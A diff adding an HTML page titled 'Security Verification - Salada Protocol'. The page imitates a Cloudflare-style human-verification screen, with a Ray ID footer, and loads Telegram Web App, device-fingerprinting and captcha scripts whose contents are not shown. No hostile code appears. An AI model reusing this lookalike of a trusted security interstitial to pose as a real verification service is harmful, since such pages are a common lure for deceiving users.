@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<script type="text/javascript">
+  // This is a CodeSandbox injection script that's used to
+  // add navigation and inspector functionality to the preview
+  (function () {
+    // 1) Get the <script> tag that's currently running:
+    var me = document.currentScript;
+
+    // 2) Create the blocking‐style <script> to load:
+    var script = document.createElement("script");
+    script.src = "https://codesandbox.io/p/preview-protocol.js";
+
+    // By default a dynamically‐inserted <script> is async=true.
+    // Turn async off to make it behave like a normal blocking <script>:
+    script.async = false;
+    // (Do NOT set defer.)
+
+    // 3) Insert it immediately after the current <script>:
+    me.parentNode.insertBefore(script, me);
+  })();
+
+  const isIFramePreview = window.top !== window.self;
+
+  // Only run this script in editor context
+  if (isIFramePreview) {
+    // This script is used to enable Chrome DevTools functionality
+    (function () {
+      var script = document.createElement("script");
+      script.src =
+        "https://codesandbox.io/p/chrome-devtool/protocol/index.js";
+
+      script.onload = () => {
+        const devtoolProtocol = window.chobitsu;
+        if (devtoolProtocol) {
+          window.addEventListener("message", (event) => {
+            const { type, data } = event.data;
+
+            if (type === "FROM_DEVTOOL") {
+              devtoolProtocol.sendRawMessage(data);
+            }
+          });
+
+          devtoolProtocol.setOnMessage((data) => {
+            if (data.includes('"id":"tmp')) {
+              return;
+            }
+
+            window.parent.postMessage({ type: "TO_DEVTOOL", data }, "*");
+          });
+
+          devtoolProtocol.sendRawMessage(
+            `{"id":5,"method":"Runtime.enable","params":{}}`
+          );
+        }        
+      }
+
+      (document.head || document.documentElement).prepend(script);
+    })();
+  }
+
+  if (typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ === "undefined") {
+    let nextID = 0;
+    let hook = (__REACT_DEVTOOLS_GLOBAL_HOOK__ = {
+      renderers: new Map(),
+      supportsFiber: true,
+      inject: (renderer) => {
+        const id = nextID++;
+        hook.renderers.set(id, renderer);
+        return id;
+      },
+      onScheduleFiberRoot() {},
+      onCommitFiberRoot() {},
+      onCommitFiberUnmount() {},
+    });
+  }
+
+  document.currentScript.remove();
+</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Verification - Salada Protocol</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="verification-container">
+        <!-- Header -->
+        <header class="header">
+            <div class="site-info">
+                <div class="site-icon">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M12 2L2 7L12 12L22 7L12 2Z" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/>
+                        <path d="M2 17L12 22L22 17" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/>
+                        <path d="M2 12L12 17L22 12" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/>
+                    </svg>
+                </div>
+                <span class="site-name">Salada Protocol Verification</span>
+            </div>
+        </header>
+
+        <!-- Main Content -->
+        <main class="main-content">
+            <!-- Hidden honeypot fields for bot detection -->
+            <input type="hidden" name="honeypot" id="honeypot" value="" style="display:none !important;">
+            <input type="text" name="email_address" id="email_address" style="position: absolute; left: -9999px; top: -9999px; opacity: 0;">
+            <div class="honeypot" style="position: absolute; left: -9999px; top: -9999px; opacity: 0;"></div>
+            
+            <div class="verification-box">
+                <!-- Status Icon -->
+                <div class="status-icon" id="statusIcon">
+                    <div class="shield-icon" id="shieldIcon">
+                        <svg width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M12 2L22 8.5V15.5C22 19.09 19.09 22 15.5 22H8.5C4.91 22 2 19.09 2 15.5V8.5L12 2Z" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/>
+                            <path d="M9 12L11 14L15 10" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                        </svg>
+                    </div>
+                </div>
+
+                <!-- Title -->
+                <h1 class="title" id="statusTitle">Verify you are human by completing the action below.</h1>
+
+                <!-- Verification Process -->
+                <div class="verification-process" id="verificationProcess">
+                    <!-- Loading State -->
+                    <div class="verification-step loading-step" id="loadingStep">
+                        <div class="step-content">
+                            <div class="loading-spinner">
+                                <div class="spinner-dots">
+                                    <div class="dot"></div>
+                                    <div class="dot"></div>
+                                    <div class="dot"></div>
+                                    <div class="dot"></div>
+                                </div>
+                            </div>
+                            <p class="step-text">Verifying...</p>
+                        </div>
+                    </div>
+
+                    <!-- Challenge Step -->
+                    <div class="verification-step challenge-step hidden" id="challengeStep">
+                        <div class="step-content">
+                            <div class="challenge-container" id="challengeContainer">
+                                <!-- Challenge content will be dynamically inserted here -->
+                            </div>
+                            <div class="challenge-actions">
+                                <button class="refresh-btn" id="refreshBtn" title="Get new challenge">
+                                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                        <path d="M3 12A9 9 0 0 1 12 3C16.97 3 21 7.03 21 12S16.97 21 12 21C7.03 21 3 16.97 3 12Z" stroke="currentColor" stroke-width="2"/>
+                                        <path d="M12 8V12L15 15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                    </svg>
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Success Step -->
+                    <div class="verification-step success-step hidden" id="successStep">
+                        <div class="step-content">
+                            <div class="success-icon">
+                                <svg width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2"/>
+                                    <path d="M9 12L11 14L15 10" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                </svg>
+                            </div>
+                            <h2>Verification successful</h2>
+                            <p>Waiting for Salada Protocol Verification to respond...</p>
+                        </div>
+                    </div>
+
+                    <!-- Error Step -->
+                    <div class="verification-step error-step hidden" id="errorStep">
+                        <div class="step-content">
+                            <div class="error-icon">
+                                <svg width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2"/>
+                                    <line x1="15" y1="9" x2="9" y2="15" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+                                    <line x1="9" y1="9" x2="15" y2="15" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+                                </svg>
+                            </div>
+                            <h2>Verification failed</h2>
+                            <p id="errorMessage">Please try again</p>
+                            <button class="retry-btn" id="retryBtn">Try Again</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Security Info -->
+                <div class="security-info">
+                    <p>Salada Protocol Verification needs to review the security of your connection before proceeding.</p>
+                </div>
+            </div>
+        </main>
+
+        <!-- Footer -->
+        <footer class="footer">
+            <div class="footer-content">
+                <div class="ray-id">Ray ID: <span id="rayId">generateRandomRayId()</span></div>
+                <div class="performance-info">Performance & security by Salada Protocol</div>
+            </div>
+        </footer>
+
+        <!-- Debug Panel (for development) -->
+        <div class="debug-panel hidden" id="debugPanel">
+            <h3>Debug Info</h3>
+            <div class="debug-item">
+                <strong>Session ID:</strong> <span id="debugSessionId">-</span>
+            </div>
+            <div class="debug-item">
+                <strong>User ID:</strong> <span id="debugUserId">-</span>
+            </div>
+            <div class="debug-item">
+                <strong>Challenge Type:</strong> <span id="debugChallengeType">-</span>
+            </div>
+            <div class="debug-item">
+                <strong>Attempts:</strong> <span id="debugAttempts">-</span>
+            </div>
+            <div class="debug-item">
+                <strong>Device Fingerprint:</strong> <span id="debugFingerprint">-</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Scripts -->
+    <script src="device-fingerprint.js"></script>
+    <script src="captcha-challenges.js"></script>
+    <script src="main.js"></script>
+
+    <!-- Telegram Web App Script -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+</body>
+</html>
